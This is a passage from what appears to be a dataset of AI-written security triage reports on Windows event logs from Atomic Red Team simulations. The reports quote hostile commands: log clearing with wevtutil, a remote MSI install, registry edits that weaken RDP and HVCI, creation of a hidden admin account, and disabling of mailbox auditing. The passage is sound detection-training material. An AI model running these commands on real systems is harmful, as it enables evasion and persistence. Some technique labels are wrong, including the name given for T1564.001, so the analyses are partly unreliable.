   - The `4672` events show the account `admin_test` logging in with special privileges, including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, among others. This is a typical behavior of an account preparing to execute administrative or potentially malicious actions.
   - Event `4616` indicates changes to the system time, possibly used to manipulate time-dependent activities or logs.

2. **Sysmon Log Analysis**:
   - Processes like `wevtutil.exe` were executed multiple times to clear event logs, as seen in commands like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Security""`.
   - There is evidence of PowerShell execution with a script aiming to modify files, as seen with `fsutil.exe` being used to set zero data and create new files in a temporary directory. This behavior aligns with file obfuscation or deletion tactics.
   - `whoami.exe` and `hostname.exe` were executed, which might have been used by an attacker to gather information about the logged-on user and environment.

3. **PowerShell Log Analysis**:
   - The PowerShell script attempts to create a new item and subsequently modify its data using `fsutil.exe`, indicative of attempts to tamper or create misleading file data. The presence of temporary directories and filenames like `AtomicRedTeam` suggests this might be related to red team testing or an advanced adversary mimicking such.

4. **System Log Analysis**:
    - The event `104` confirms logs were cleared by `admin_test`. Clearing logs from various channels (`System` and `Windows PowerShell`) further corroborates the attempt to erase traces.

**Assessment**:
- The combination of security log clearing, use of administrative privileges, systime manipulations, and PowerShell script execution, indicates potentially malicious activity.
- Wevtutil usage and the clearing of logs reinforce that the actions were intended to obscure traces, further aligning with malicious intent.

**Resolution**:
- **MALICIOUS**: The observed anomalies (log clearing, privileged operations, file manipulations) combined with the use of common TTPs (Tactics, Techniques, and Procedures) strongly indicate malicious activity.

**Guidance**:
- Initiate an incident response to further investigate the origins and extent of the compromise.
- Check for unauthorized access, especially focusing on the `admin_test` account and any deviations from normal behavior.
- Implement measures to prevent tampering, such as restricting the use of `wevtutil.exe` and monitoring for unauthorized use of administrative tools and PowerShell.
- Consider reviewing network logs for any external connections or data exfiltration attempts and perform a full integrity check of the system."
Msiexec.exe - Execute Remote MSI file,"Upon analyzing the provided Windows event logs, several activities are noteworthy:

1. **Usage of `wevtutil.exe`:** The `wevtutil.exe` utility is seen being used multiple times with the `cl` (clear) command, targeting the Sysmon, Application, System, Security, and Windows PowerShell logs. This indicates a potential attempt to cover tracks by clearing logs, which is a known tactic in malicious activities.

2. **Installation Activity from a URL:** The logs indicate the execution of a command using `msiexec.exe` with a URL pointing to an MSI hosted on GitHub (`https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi`). The Atomic Red Team is a known project that provides tests for adversary tactics, and this could indicate testing or simulation of bypass techniques but also a potential attempt at executing unauthorized code under the guise of testing.

3. **PowerShell Activity:** There is a PowerShell command that is executing a script with the argument `-nop -Command Write-Host JScript executed me!; exit`, indicative of a script execution that could potentially be used for red teaming or testing purposes.

4. **Log Clearing Actions:** Specifically noticed log clearing activities occurring almost simultaneously in different channels (System and Security event logs). This is a further indication of covering tracks.

5. **Privileges and Integrity Levels:** The commands and scripts were executed under a high integrity level by the user `SERVER002\\admin_test`, suggesting they had administrative privileges on the system.

**Assessment:**
- The use of `wevtutil.exe` to clear logs is certainly suspicious and usually indicative of malicious activity aimed at hiding evidence of other actions taken on the system.
- The execution of the `msiexec` with a remote MSI file and the subsequent execution of PowerShell are also suspicious. While they could be part of legitimate testing (given the reference to Atomic Red Team), they also align with known techniques for remote code execution by adversaries.

**Resolution: MALICIOUS**
Given the combination of red flags—log clearing activities, execution of remote command and scripts with administrative privileges, Powershell script execution, and the overall context of these events—these logs display clear indicators of a likely malicious compromise or unauthorized penetration testing activity without transparency or approval. It is recommended to:
1. Investigate the `admin_test` user's recent activities and purpose. Ensure this account's activity aligns with authorized actions.
2. Conduct a full forensic analysis of the system to ensure no backdoors or unauthorized software remain.
3. Review and enhance logging mechanisms and security controls to prevent log tampering.
4. Ensure the security team's awareness and agreement on the use of tools like those from Atomic Red Team in the production environment."
Hidden Window,"### Analysis:

#### Security Log:
1. **Event ID 1102**: The security event log was cleared by the user `admin_test`. Clearing logs, especially security event logs, is a significant red flag as it is a common tactic used by attackers to cover their tracks.
2. **Event ID 4616**: The system time was adjusted. While time changes themselves are not necessarily malicious, combined with other suspicious activities, they can indicate attempts to manipulate time-based security controls or evade time-based logging.

#### Windows PowerShell Log:
1. **PowerShell Events (Event ID 600)**: Several PowerShell log entries show the command `powershell.exe & {Start-Process powershell.exe -WindowStyle hidden calc.exe}`. This command sequence indicates an attempt to run a PowerShell script that spawns additional hidden processes. Triggering the calculator (calc.exe) in a hidden window could be indicative of testing capabilities or obfuscating more malicious activities.

#### Sysmon Log:
1. **Process Creation Events (Event ID 1)**: 
   - Multiple occurrences of processes `wevtutil.exe` and `conhost.exe` orchestrated under the user `admin_test` are observed. Specifically, `wevtutil.exe` is used to clear various logs (Application, System, and Security) which aligns with the log clearing events in the Security log.
   - The use of PowerShell in conjunction with hidden processes coincides with activities in the PowerShell logs.
   
2. These activities suggest a coordinated procedure to initiate actions tending towards malicious intentions, leveraging PowerShell and log manipulations for obfuscation and persistence or further commands.

#### System Log:
1. **Event ID 104**: System event logs are also cleared around the same timeframe (`admin_test`), further consolidating evidence of potential log tampering.

### Assessment:
The combination of events—log clearing, the suspicious use of PowerShell to run hidden processes, and the correlation of timestamps across logs indicative of log manipulation—strongly suggests malicious activities. The actions of user `admin_test`, who uses administrative privileges for these activities, reinforce the potential for an insider threat or compromised user account.

### Resolution:
**MALICIOUS** - Based on the evidence of log tampering, suspicious PowerShell executions, and the coordinated nature of the activities, the logs reveal malicious intentions. Immediate action should be taken to isolate the affected host, conduct forensic investigations, review administrative access, and reset credentials for the compromised account `admin_test`. Furthering controls to monitor and restrict PowerShell usage and event log accesses are advised."
Office 365 - Set Audit Bypass For a Mailbox,"Upon reviewing the provided Windows event logs, I have identified a series of events that are suspicious and may indicate malicious activity:

1. **Clearing of Event Logs (Security Event 1102 & System Event 104)**:
   - The Security log shows event 1102 indicating that the event log was cleared by the user ""admin_test"". This is a significant red flag in cybersecurity, as attackers often clear logs to cover their tracks.
   - In addition, System log events 104 confirm the clearing of multiple logs (including Security and Windows PowerShell) by the same user, reinforcing the suspicious nature of these actions.

2. **Suspicious PowerShell Activity (Sysmon Events & PowerShell Logs)**:
   - There are multiple instances of PowerShell usage where sensitive actions appear to be performed, such as connecting to Exchange Online with credentials bypassing audit logs. This includes:
     - Sysmon EventID 1, showing `powershell.exe` executing the command to connect to Exchange Online using plain-text credentials (`$secure_pwd = ""o365_password_test"" | ConvertTo-SecureString -AsPlainText -Force`).
   - These command-line actions (particularly the disabling of mailbox auditing with `Set-MailboxAuditBypassAssociation -AuditBypassEnabled $true`) are common tactics used by attackers to persist undetected.

3. **High Integrity Level Processes**:
   - Processes like `wevtutil.exe` and `WindowsPowerShell.exe` are executed with high integrity levels, a behavior associated with administrative privileges. These are related to log clearing and suspicious script execution, as detailed above.

Given these findings:

- **Suspicious Indicators**: The clearing of logs combined with the execution of potentially harmful PowerShell commands strongly suggests an attempt to perform unauthorized actions while covering tracks. This behavior is a hallmark of possible compromise, though not definitive without further investigation into the context and intent.

- **Resolution**: **SUSPICIOUS** - The activities observed in the logs raise significant concerns regarding potential unauthorized access and abuse of system permissions and capabilities. Further investigation is crucial to confirm or rule out malicious intent.

**Recommended Actions**:
1. **Conduct a thorough investigation** into user ""admin_test"" activities, including any changes to permissions and access to sensitive systems and data.
2. **Review audit logs in Exchange Online** to inspect the usage of the script and investigate if similar commands were run.
3. **Analyze related network traffic** for signs of data exfiltration or anomalous connections during the time of these events.
4. Implement security measures such as enabling more detailed logging and applying stricter execution policies on PowerShell and other administrative utilities.
5. Consider an immediate security review for the affected systems for any signs of compromise and take necessary remediation steps if needed."
Enabling Remote Desktop Protocol via Remote Registry,"Based on the analysis of the provided Windows event logs, the following observations and assessments can be made:

### Suspicious Behavior Observed:

1. **Event Log Clearing:**
   - Multiple event log clearance activities occurred at the same time (System, Security, and Windows PowerShell logs) by the user `admin_test`. This is represented by:
     - System log EventID 104
     - Security log EventID 1102
   - These logs were cleared using `wevtutil.exe` which is indicative of log tampering or covering tracks after potentially malicious actions.

2. **Use of Elevated Command-line Operations:**
   - The logs reveal that `cmd.exe` was used with the command `reg add ""hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp"" /v SecurityLayer /t REG_DWORD /d 0 /f`.
   - Modifying the registry key for RDP settings could indicate an attempt to weaken security or enable an unauthorized remote access configuration.

3. **Multiple `wevtutil.exe` Executions:**
   - The extensive use of `wevtutil.exe` for clearing logs may further indicate attempts to hide activities.
   - `wevtutil.exe` was run multiple times to clear different log channels, as observed from the Sysmon logs.

### Indicators of Potential Malicious Activity:

- **Log Clearing:** Especially the clearing of Security and System logs, is a significant indicator of potential malicious activity, aimed at erasing evidence of an intrusion or unauthorized actions.
  
- **Registry Modification:** The execution of commands to modify RDP settings in the registry suggests an attempt to alter system configurations, potentially to facilitate or maintain unauthorized access.
  
These behaviors are highly suspicious and likely indicative of an attempt to cover tracks after malicious activities were performed on the system.

### Conclusion:

**Resolution: SUSPICIOUS**

These event logs contain suspicious activity that warrants further investigation. The clearing of event logs, especially under the same timeframe across multiple log types, and critical registry modifications executed via command-line utilities signify potential abnormal behavior typically associated with system compromise efforts.

### Recommended Actions:

1. **Incident Response:** Initiate an incident response protocol to investigate the system for further signs of compromise and unauthorized access.
  
2. **User Verification:** Review and verify the actions of the `admin_test` account. Assess whether the account credentials have been compromised.
  
3. **System Audit and Monitoring:** Conduct a thorough audit of other systems for similar behavior and enhance monitoring to detect further suspicious activities.

4. **Review and Secure RDP Settings:** Ensure that no unauthorized RDP settings changes persist, which could result in security breaches.

5. **Log Retention Policies:** Implement and enforce strict log retention policies and use centralized logging solutions to prevent local tampering."
Create Windows System File with Attrib,"Based on the provided Windows event logs, let's analyze and identify any indicators of suspicious or malicious activity:

### Security Log:
1. **Event ID 1102**: This event indicates that the audit logs were cleared by the user `admin_test`. Log clearing is often associated with efforts to hide malicious activity, which is suspicious unless explained by regular administrative duties.

### Application Log:
1. **Edge Update Events**: The entries related to `edgeupdate` services stopping and starting could be part of regular update activities. However, it draws attention if these coincide with other suspicious activities on the system.

### Sysmon Log:
1. **Cmd.exe Usage**: The use of `cmd.exe` with the command `IF EXIST %%temp%%\T1564.001.txt` and subsequently `echo system_Attrib_T1564.001 >> %%temp%%\T1564.001.txt` indicates use of obfuscation or a potential defense evasion attempt. This behavior correlates to MITRE ATT&CK technique T1564.001 (System Binary Proxy Execution).
   
2. **Log Clearing via Wevtutil**: Observed use of `wevtutil.exe` to clear various event logs such as Security, System, and Windows PowerShell is highly suspicious and suggests an attempt to cover tracks.

3. **Microsoft Edge Update Activities**: Multiple instances of `MicrosoftEdgeUpdate.exe` processes being executed are observed, including in temporary directories. The behavior aligns with a software update but should be correlated with known update schedules to verify legitimacy.

### System Log:
1. **Event ID 104**: This also records the clearing of event logs by `admin_test`, further supporting the suspicion of deliberate log clearance.

### Conclusion:
The occurrence of both log clearing events (ID 1102 and 104) and unusual command-line access alongside file manipulations strongly suggests potential suspicious activity, especially given the use of high-integrity level processes.

**Assessment**: Based on the analysis, the activities noted raise significant concerns regarding potential malicious intent, especially efforts to modify or clear logs. Given these events, I would categorize the findings as **MALICIOUS** due to clear attempts to manipulate processes and obfuscate actions on the system.

**Next Steps**:
- Escalate the issue for immediate investigation and containment.
- Check backups and potentially perform a full system audit.
- Review and potentially revoke the impacted user or process privileges.
- Correlate this activity with any external anomalies or data transfers."
Invoke CHM with InfoTech Storage Protocol Handler,"Upon examining the provided Windows event logs, I have identified several indicators that suggest potentially suspicious or malicious activity:

### Observations:

1. **PowerShell Event**:
   - Several logs show the execution of PowerShell commands. Notably, the command `powershell.exe & {Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}` was observed. The `Invoke-ATHCompiledHelp` command is not a known or standard PowerShell command, which could indicate the use of a custom or malicious script. Additionally, PowerShell is often leveraged for malicious purposes due to its powerful scripting capabilities.

2. **Clearing of Event Logs**:
   - The security log (EventID: 1102) and system log (EventID: 104) indicate that logs were cleared. The log-clearing actions were performed by the same user account, `admin_test`. Clearing logs can be an indicator of malicious activity as it is often done to cover tracks.
   
3. **Wevtutil Command Execution**:
   - The Sysmon logs capture the `wevtutil.exe` utility being executed with commands to clear logs (e.g., `wevtutil.exe cl System`). This corresponds with the log-clearing events noted in other logs. The execution of this command under the admin context (`SERVER002\\admin_test`) heightens suspicion.

4. **High Integrity Level Processes**:
   - Multiple processes, including PowerShell, are running with a high integrity level, allowing elevated privileges. This may not inherently be suspicious but, in conjunction with other actions, could be part of a privilege escalation attempt or malicious activity.

### Assessment:

- **SUSPICIOUS BEHAVIOR**:
  - The combination of unknown PowerShell commands and log-clearing activities highly suggests an attempt to perform or hide potentially malicious actions.
  - The clearing of various logs, often immediately after unusual command execution, suggests attempts to remove traces of what could be unauthorized or harmful activities.

### Recommendation:

1. **Immediate Actions**:
   - Isolate the affected system (Server002) from the network to prevent potential lateral movement by an adversary.
   - Conduct a full memory and disk forensic analysis to capture and analyze any potential residual malicious scripts or executables.

2. **Review and Audit**:
   - Review login/logoff events and user activities for the `admin_test` account to check for unauthorized access or actions.
   - Audit permissions and review users with administrative privileges to ensure that they are warranted and secure.

3. **Additional Monitoring**:
   - Increase monitoring on PowerShell activities and alert on any use of non-standard or obfuscated command execution.
   - Implement logging solutions that can centralize logs to prevent unauthorized log clearing.

Based on these observations and analyses, the activity is categorized as **SUSPICIOUS**. Further in-depth investigation is necessary to determine the extent of the potential compromise and to prevent any ongoing threats."
office-365-Disable-AntiPhishRule,"**Detailed Analysis of Logs:**

1. **PowerShell Logs:**
   - The logs indicate PowerShell activities on `Server002` involving connections to Exchange Online and manipulation of anti-phishing rules. 
   - The use of the `Disable-AntiPhishRule` cmdlet suggests actions to disable anti-phishing protections, which could be a red flag.
   - The PowerShell command string is crafted to handle SecureString conversion and credential creation, which is a common practice in scripts requiring authentication with external services, but the activity of disabling anti-phishing rules is particularly concerning.

2. **Sysmon Logs:**
   - There are multiple instances of PowerShell execution noted, specifically with the execution of commands that manipulate the Exchange service settings and inspect Windows INF files.
   - Actions such as clearing the event logs, noted especially with `wevtutil.exe` clearing logs from Windows PowerShell and Security channels, stand out as they can be indicative of attempts to hide tracks.
   - The `High` and `System` integrity levels for processes imply elevated privileges, which, along with the actions performed, suggest suspicious behavior.

3. **Security Logs:**
   - Security Event ID 1102 indicates that the Security log was cleared, which is a significant red flag as it is commonly associated with malicious attempts to cover tracks.

4. **System Logs:**
   - Similar behavior with System logs being cleared (Event ID 104) was recorded. The clearing of logs is a notable concern and indicative of potential malicious intent to obfuscate actions.

5. **Application Logs:**
   - The events related to the Software Protection Platform Service don't seem suspicious in this context but maintain relevance in understanding system licensing and protection statuses.

**Assessment of the Situation:**

- **Suspicious or Anomalous Activities:**
  - The disabling of security rules (particularly anti-phishing) without a legitimate business case can be seen as malicious.
  - The consistent clearing of multiple event logs is genuinely suspicious and suggests an intent to hide malicious activities.
  - Combined high integrity-level processes operating with elevated privileges to clear logs and execute potentially harmful commands underline the risk further.

**Threats/Risks Identified:**
- The activities described, particularly disabling security features and clearing logs, strongly suggest a potential security compromise.
- This could indicate an internal user with malicious intent, abuse of privileged access, or a compromised user account.

**Guidance on How to Proceed:**
1. Initiate a full security incident response to investigate the source and scope of the potentially malicious behavior.
2. Review and audit all accounts with similar elevated privileges, focusing on `admin_test`, to determine if the account has been compromised.
3. Immediately restore any disabled security features such as anti-phishing protections.
4. Monitor connections to the network perimeter, external service accesses, and sensitive roles for unusual activities.
5. Enhance logging and monitoring to detect any further unauthorized actions proactively.
6. Educate and remind users, especially admins, about the risks of turning off security features and the importance of maintaining a secure environment.

**Resolution: MALICIOUS**

Due to the combination of disabling security measures and the systematic clearing of logs without rational operational justification, the activities identified in the logs are concluded to be of a malicious nature. Immediate action is necessary to prevent further potential damage and to secure the affected systems."
Disable Hypervisor-Enforced Code Integrity (HVCI),"Upon analyzing the provided Windows event logs, the following observations and analysis can be made:

1. **Log File Clearing:**
   - The logs show several instances where logs for the ""System"", ""Windows PowerShell"", ""Microsoft-Windows-Sysmon/Operational"", ""Application"", and ""Security"" channels were cleared. Key events from the System and Security logs with EventID 104 and 1102 respectively point to log clearance.
   - The user ""SERVER002\\admin_test"" initiated these actions using `wevtutil.exe`. Clearing log files is often associated with attempts to hide malicious activity.

2. **Registry Changes:**
   - There are multiple registry querying actions observed through the use of `cmd.exe` and `reg.exe`, particularly around the DeviceGuard settings, which involve checks on EnableVirtualizationBasedSecurity and other similar keys.
   - A suspicious registry operation using PowerShell modified the registry key `HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity` to change the ""Enabled"" value to 0 (disabled). This could potentially disable security features, which is a common tactic in malicious activities to lower defenses on a host machine.

3. **Simultaneous Occurrence of Commands:**
   - There are occurrences of commands being executed very close in time to each other, specifically those related to querying system settings, consistent with automated scripting or a batch operation.
   - The PowerShell script executed by ""admin_test"", especially concerning registry modification, aligns with an escalation or persistence tactic.

4. **Suspicious Use of Utilities:**
   - The consistent usage of utilities like `wevtutil.exe`, `reg.exe`, and `PowerShell.exe` provides further evidence of actions being taken to manipulate or investigate system configurations and logs. These utilities can be indicative of post-exploitation activities in a compromised environment.

### Conclusion and Resolution:
Based on the above observations:

- **Clearance of event logs,** indicating attempts to cover tracks, along with the **modification of security-related registry settings**, performed using administrative privileges, strongly suggest a post-exploitation stage of a cyber kill chain where an attacker is attempting to disable security features and hide traces.
- The user executing these suspicious operations is ""SERVER002\\admin_test"".

Given the combination of log clearing, registry manipulation aimed at security features, and the execution patterns, the activities recorded in these logs should be classified as **MALICIOUS**.

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Isolate the host (""Server002"") from the network to prevent potential lateral movement.
   - Conduct a thorough forensic investigation to determine the root cause of compromise, means of system access, and extent of the breach.
   - Check for any additional indicators of compromise (IoCs) across the network and associated systems.

2. **Remediation Steps:**
   - Restore registry and system settings to enforce security policies.
   - Change all administrative passwords and apply the principle of least privilege.
   - Reconfigure and audit log settings to prevent unauthorized clearance and external logging if possible.

3. **Preventive Measures:**
   - Implement stricter access control and monitoring mechanisms for high-privileged accounts.
   - Regularly update and patch systems while maintaining up-to-date security configurations.
   - Educate users on cybersecurity best practices and warning signs.

Perform these actions under the guidance of specialized incident response teams and ensure communication with all stakeholders throughout the process."
Create Hidden User in Registry,"After analysis of the logs provided, the following observations can be made:

1. **Process Execution and Anomalous Activities:**
   - Multiple instances of `wevtutil.exe` seem to be invoked by the user `SERVER002\admin_test`. These invocations are clearing different log channels (`Microsoft-Windows-Sysmon`, `Application`, `System`, `Security`, `Windows PowerShell`) which is suspicious behavior as it can be an indicator of log tampering or covering tracks after malicious activities.
   - Command execution involving `cmd.exe`, `net.exe`, and `reg.exe` for creating a new user `AtomicOperator$` and modifying registry settings aligns with typical malicious behavior for establishing persistence and creating unauthorized user accounts. The command line specifically adds a user and tries to hide it in the registry.

2. **Security Log Events:**
   - Event ID `1102` indicates the security log was cleared. This is a strong sign of malicious activity as attackers often clear logs to erase traces.
   - Event IDs `4720`, `4722`, `4724`, `4738` show a sequence of actions to create and manipulate a user account `AtomicOperator$`. These are indicative of unauthorized account creation and privilege manipulation.

3. **Time Change Events:**
   - Event ID `4616` in the security log related to time change shows a very short time modification which might affect the chronological order of logs. This might be an attempt to desynchronize logs to cover tracks.

4. **No Suspicious Activity in Windows PowerShell and Application Logs:**
   - From the PowerShell log perspective, there are no entries provided to evaluate, which remains unclear and warrants fetching of additional data if available.

**Assessment and Resolution:**
- The activities observed in the provided logs clearly indicate malicious intent due to log clearance, unauthorized account creation, and privilege modifications.
- The specific use of system utilities to manipulate logs and user accounts without clear legitimate intent is a concerning red flag.

**Resolution: MALICIOUS**

**Guidance:**
- Immediate actions should be taken to investigate and contain the potential breach. This includes:
  - Isolating the affected system `Server002` to prevent further malicious actions or lateral movements.
  - Conducting a thorough forensic investigation to understand the extent of compromise.
  - Reviewing and enhancing current security measures, such as user auditing and access controls.
  - Inspecting other systems within the network for similar activity.
  - Regularly backing up and reviewing logs to ensure tamper detection.

Additional steps should include revising account controls and password policies to prevent unauthorized account creation. Also, an in-depth review of remote access configurations is recommended."
Disable Windows Registry Tool,"Upon reviewing the provided event logs, several activities stand out as suspicious or potentially indicative of malicious activity:

1. **Clearing of Event Logs**: 
   - Multiple instances of the `wevtutil.exe` tool were used to clear logs (EventIDs 1102, 104) across different log channels (Security, System, Windows PowerShell). This is a common tactic used by attackers to cover their tracks after executing unwanted operations on a system. The user associated with these operations is `SERVER002\\admin_test`, which should be investigated to confirm if this activity was authorized.

2. **Command Execution with cmd.exe**:
   - A command was executed to modify registry settings, specifically to disable registry tools. The command was: `""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f`. This modification can be considered suspicious as it attempts to restrict access to the registry, potentially preventing administrative users from recovering from changes made by malware.

3. **Non-Standard Processes**:
   - The process tree involving `cmd.exe` and `reg.exe` execution indicates potentially malicious activity with an intent to modify system policies in a way that might hinder system administration.

4. **Log Tampering**:
   - Further attempts were present to export logs using another instance of `wevtutil.exe` with the command: `""C:\\Windows\\system32\\wevtutil.exe"" epl Microsoft-Windows-Sysmon/Operational C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\TempLog.evtx`. The action to export logs could indicate attempts to exfiltrate log data.

**Assessment**:
Given the combination of log-clearing tactics, registry modifications that disable system administration tools, and attempts to handle logs in a way that might cover tracks or exfiltrate data, these activities collectively align with behaviors typically observed in compromised environments.

- **Resolution**: MALICIOUS

**Guidance**:
- Investigate the user `SERVER002\\admin_test` to verify if this behavior was legitimate or if the account was compromised.
- Check for other indications of compromise on the network or other systems, especially for lateral movement.
- Conduct a full security audit and forensic analysis on `Server002` to identify other potential security breaches or vulnerabilities.
- Consider checking network traffic logs to identify if any data exfiltration attempts occurred.
- Review and enhance security policies to prevent unauthorized log manipulation and ensure audit trails are secure and resilient to tampering."
System File Copied to Unusual Location,"**Analysis of the Windows Event Logs:**

The logs provided contain several indicators of potentially malicious activities, specifically involving PowerShell and event logs clearing.

1. **Security Log Clearance (Event ID 1102 and 104)**:
   - An event log clearance is recorded for both the Security and System channels. This is a suspicious activity as clearing event logs can be an attempt to cover up other malicious activities. The user associated with this action is `admin_test`.

2. **PowerShell Script Execution**:
   - There are multiple instances of a PowerShell script running, which involves copying the `cmd.exe` file to the `C:\ProgramData\` directory, starting a process with this copied file, and then stopping it shortly after. This behavior can be considered suspicious. Executing `cmd.exe` from a non-standard location is a known tactic used for maintaining persistence or executing hidden commands.

3. **Sysmon Logs (Process Creation Events)**:
   - The execution of `wevtutil.exe` clearing logs is seen in the Sysmon logs. The `wevtutil.exe` tool is used to manage event logs and can delete logs using the `cl` command, seen here clearing logs like `Microsoft-Windows-Sysmon/Operational`.
   - Suspicious process creation involving `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and host process `wsmprovhost.exe` indicates potential misuse of legitimate tools.
   - The execution of a PowerShell script in a temporary directory to manipulate `cmd.exe` and execute it is concerning. The presence of this script in the `Windows PowerShell` logs further cements the suspicious nature of these events.

4. **System and Application Log Clear Events**:
   - Frequent log clear events observed shortly after suspicious activities are usually a red flag that indicates someone trying to hide their tracks. 

5. **Legitimate Updates**: 
   - There are entries related to Microsoft Edge and Windows Update that appear normal for maintenance and updates by the system.

**Assessment and Conclusion**:
Based on the analysis, these logs indicate a series of actions that align with known techniques for persistence and covering tracks after potentially malicious activities. The presence of executed scripts that move and run system executables from non-standard directories, combined with event log clearance, strongly indicates malicious intent or activity.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Isolate `Server002` from the network immediately to prevent further potential action from malicious actors.
- Conduct a thorough investigation to identify any unauthorized changes to critical files and system configurations.
- Review any potential data exfiltration or unauthorized access during the timeframe of the logs.
- Restore the system from a known good backup, if available, to ensure cleanliness.
- Enhance monitoring and logging configurations to prevent and detect similar activities in the future.
- Assess and improve security awareness and access controls, especially for administrative accounts like `admin_test`."
attrib - hide file,"Upon analyzing the provided Windows event logs, the following observations and assessments can be made:

### Suspicious or Anomalous Behavior:

1. **Log File Clearing**:
   - **Security Log**: Event ID 1102 indicates that the security log was cleared. This is typically a red flag as malicious actors often clear logs to cover their tracks. The action was performed by the user `admin_test` with LogonId `0x13EBDC`.
   - **System Log**: Events with ID 104 show that other logs, including System and Windows PowerShell, were also cleared by the same user `admin_test`.

2. **Use of Wevtutil.exe**:
   - Multiple entries in the Sysmon logs indicate the use of `wevtutil.exe` to clear event logs (e.g., Event ID 17979, 17983, 17991). This utility is often used for event log management but can be misused to delete logs as part of anti-forensic activities.

3. **Creation of Hidden Directories and Files**:
   - A command executed with `cmd.exe` to create directories and files with hidden attributes (`attrib.exe +h`) is found in the logs. This is not typical behavior for regular administrative tasks and may indicate an attempt to hide malicious activities or scripts.

### Indicators of Malicious Activity:

- The sequence of clearing security, system, and other logs suggests an effort to conceal activities on the host.
- The manual use of `wevtutil.exe` to clear specific logs aligns with activities seen in malicious scenarios to eliminate traces.
- The admin user `admin_test` appears to be highly involved, either maliciously or compromised by an unauthorized actor, due to the patterns of log clearing and command execution.

### Assessment & Threats:

- The combination of cleared logs, use of legitimate utilities in potentially nefarious ways, and hiding techniques points towards malicious intent.
- There are clear signs of log tampering, which is common in post-compromise scenarios to hide the tracks of an attacker.

### Guidance on How to Proceed:

1. **Resolution**: MALICIOUS
2. Immediate actions should include isolating the host to prevent further compromise.
3. Investigate the user account `admin_test` to confirm whether it was legitimately accessed or compromised.
4. Conduct a detailed file system and network analysis to uncover potentially hidden or malicious files and network connections initiated from the host.
5. Restore logs from backups if possible and perform a historical analysis to identify suspicious activities leading up to the logged events.
6. Consider implementing enhanced logging and monitoring measures to capture a detailed account of system activities and mitigate future incidents.

This assessment concludes the log review with evidence pointing towards malicious behavior indicative of a security breach. Immediate incident response actions are recommended to contain and investigate the incident further."
Store file in Alternate Data Stream (ADS),"### Detailed Analysis:

**Indicators of Potential Malicious Activity:**

1. **Event Log Clearing Activity:**
   - Multiple instances of event logs being cleared, indicated by EventID 104 in the System log and EventID 1102 in the Security log, all initiated by the user ""admin_test"" from ""SERVER002"". This activity is highly suspicious as it may be an attempt to cover up traces of malicious activity.

2. **Usage of Sysinternal's `wevtutil.exe`:**
   - The `wevtutil.exe` command is used multiple times (seen in EventID 1 and 5 in Sysmon logs) to clear logs (`cl` argument) for different channels: Application, System, Security, and Windows PowerShell. This type of activity often indicates an attempt to erase evidence of certain operations.

3. **Execution of Suspicious PowerShell Script:**
   - A PowerShell script is executed that attempts to create a directory (`C:\Users\Public\Libraries\yanki`) and writes output to an alternate data stream (`C:\Users\Public\Libraries\yanki\desktop.ini:desktop.ini`) using `cmd.exe`. This can be indicative of attempts to hide malicious scripts or data exfiltration methods.

4. **Time Manipulation:**
   - EventID 4616 in the Security logs and EventID 1 in the System logs show that the system time has been reset. Tampering with system time can be a tactic used by attackers to avoid detection by altering time of execution records.

5. **High Integrity Level Processes:**
   - Several processes are executed with high integrity level, suggesting privilege escalation or usage of an account with administrator-level privileges.

6. **Process Execution:**
   - The `cmd.exe` and `conhost.exe` processes, spawned by PowerShell and legitimate applications (`MicrosoftEdgeUpdate.exe`), are observed. The `cmd.exe` execution includes redirection of `cmd.exe` itself, which is unconventional and suspicious.

**Assessment:**
- The combination of log clearing activities, suspicious PowerShell script execution with potential hiding of data, time manipulation, and use of administrator-level privileges strongly indicates malicious activity. The presence of these elements typically aligns with adversarial techniques in advanced persistent threats (APTs) or coordinated cyberattacks.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
1. **Immediate Containment:**
   - Isolate Server002 from the network to prevent potential lateral movement or data exfiltration.
   
2. **Thorough Investigation:**
   - Conduct a full forensic analysis on Server002 to uncover any undetected malicious tools and assess the extent of the compromise.
   - Review all user accounts, especially ""admin_test"", to ensure there are no unauthorized changes or creations and enforce password resets.

3. **Log Analysis and Monitoring:**
   - Correlate logs from other machines in the network for similar suspicious activities.
   - Increase logging verbosity and implement real-time monitoring for anomalies, especially focused on log clearing, PowerShell use, and time changes.

4. **Patch and Security Review:**
   - Ensure all systems are up-to-date with the latest security patches.
   - Review firewall and security policies to strengthen defense mechanisms against potential exploits used.

5. **Communication and Reporting:**
   - Inform the IT and security teams to be vigilant of similar activities and escalate any suspicious findings.
   - Prepare a report for management summarizing findings, implications, and recommended actions for remediation and future prevention.

This investigation has identified significant evidence of malicious actions aimed at clearing evidence and potentially covering up further activities. Prompt action is necessary to assess and mitigate any ongoing threats."
Lolbin Gpscript logon option,"Based on the analysis of the provided event logs, the following observations can be made:

1. **Clearing of Event Logs:**
   - A series of events indicate that the system, security, and Windows PowerShell event logs were cleared (Event ID 1102 and 104). The user account ""admin_test"" was responsible for these actions, and the event logs for security, system, and Windows PowerShell were cleared in quick succession. This behavior is typically suspicious as attackers often clear event logs to cover their tracks, making it a potential indicator of malicious activity.

2. **Wevtutil Executions:**
   - Multiple instances of `wevtutil.exe` are executed to clear various logs (Sysmon Event ID 1). This command-line utility is used to manage event logs on Windows and can be used by attackers to delete logs as part of a cleanup process. The specific command-line argument `cl` (clear) was used, supporting the evidence that event logs were intentionally cleared.

3. **Command Execution with High Integrity Level:**
   - Various processes were executed with high integrity levels, indicating they were run with elevated privileges. Notably, a `cmd.exe` process was executed with the command `/c Gpscript /logon`, which could indicate a scheduled task or policy script execution. However, this alone isn't inherently malicious without further context.
   
4. **Time Discrepancies:**
   - Indicators of time synchronization can be seen (`Microsoft-Windows-Kernel-General` with time updates), which in isolation isn't suspicious but is part of the overall system operations. 

5. **Microsoft Edge Update:**
